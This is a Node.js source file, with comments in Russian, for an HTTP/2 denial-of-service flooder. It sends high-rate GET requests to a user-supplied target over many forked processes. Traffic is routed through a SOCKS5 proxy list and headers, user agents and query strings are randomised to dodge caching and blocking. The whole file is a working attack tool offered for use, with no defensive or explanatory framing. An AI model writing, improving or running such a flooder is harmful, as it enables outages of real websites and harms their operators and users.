const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");
const { SocksProxyAgent } = require('socks-proxy-agent'); // <-- добавлено

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7){
    console.log(`node tlshttp2improved.js target time rate thread proxyfile`);
    console.log(`Пример: node tlshttp2improved.js https://example.com 120 100 8 socks5.txt`);
    process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 1);
}

// ==================== УДАЛЁН КЛАСС NetSocket (HTTP CONNECT) ====================

const fetch_site = ["same-origin", "same-site", "cross-site"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "worker"];

const languages = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "es-ES,es;q=0.9",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8"
];

const useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0"
];

const referers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.yahoo.com/",
    "https://www.baidu.com/",
    ""
];

function buildHeaders() {
    const rand_query = "?" + randomString(12) + "=" + randomIntn(100000, 999999);
    const rand_path = (parsedTarget.path || "/") + rand_query;

    const headers = {
        ":method": "GET",
        ":scheme": "https",
        ":authority": parsedTarget.host,
        ":path": rand_path,
        "user-agent": randomElement(useragents),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": randomElement(languages),
        "accept-encoding": "gzip, deflate, br, zstd",
        "sec-fetch-site": randomElement(fetch_site),
        "sec-fetch-dest": randomElement(fetch_dest),
        "sec-fetch-mode": randomElement(fetch_mode),
        "upgrade-insecure-requests": "1",
        "te": "trailers"
    };

    const ref = randomElement(referers);
    if (ref) headers["referer"] = ref;

    if (Math.random() > 0.5) {
        headers["dnt"] = "1";
    }

    if (Math.random() > 0.7) {
        headers["sec-ch-ua"] = `"Chromium";v="${randomIntn(130, 131)}", "Not_A Brand";v="8"`;
        headers["sec-ch-ua-mobile"] = "?0";
        headers["sec-ch-ua-platform"] = randomElement(['"Windows"', '"macOS"', '"Linux"']);
    }

    return headers;
}

function runFlooder() {
    const proxyAddr = randomElement(proxies).trim();
    if (!proxyAddr || !proxyAddr.includes(":")) return;

    // Формат прокси: ip:port   или   ip:port:user:pass
    const parts = proxyAddr.split(':');
    let proxyHost = parts[0];
    let proxyPort = parseInt(parts[1]);
    let username = parts.length > 2 ? parts[2] : null;
    let password = parts.length > 3 ? parts[3] : null;

    // Формируем строку для SocksProxyAgent
    let proxyStr = `socks5://${proxyHost}:${proxyPort}`;
    if (username && password) {
        proxyStr = `socks5://${username}:${password}@${proxyHost}:${proxyPort}`;
    }

    const agent = new SocksProxyAgent(proxyStr);

    const tlsConn = tls.connect({
        host: parsedTarget.host,
        port: 443,
        agent: agent,               // <-- проксируем через SOCKS5
        ALPNProtocols: ['h2'],
        rejectUnauthorized: false,
        servername: parsedTarget.host
    });

    tlsConn.setKeepAlive(true, 60000);

    const client = http2.connect(parsedTarget.href, {
        createConnection: () => tlsConn,
        settings: {
            maxConcurrentStreams: 200,
            initialWindowSize: 65535,
            enablePush: false,
        },
        maxSessionMemory: 64000,
    });

    let IntervalAttack = null;

    client.on("connect", () => {
        IntervalAttack = setInterval(() => {
            for (let i = 0; i < args.Rate; i++) {
                const headers = buildHeaders();
                const request = client.request(headers);

                request.on("response", () => {
                    request.close();
                    request.destroy();
                });

                request.on("error", () => {
                    request.destroy();
                });

                request.end();
            }
        }, 1000);
    });

    const closeAll = () => {
        if (IntervalAttack) clearInterval(IntervalAttack);
        client.destroy();
        tlsConn.destroy();
    };

    client.on("close", closeAll);
    client.on("error", closeAll);
    tlsConn.on("error", closeAll);
    tlsConn.on("end", closeAll);
    tlsConn.on("timeout", closeAll);
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);
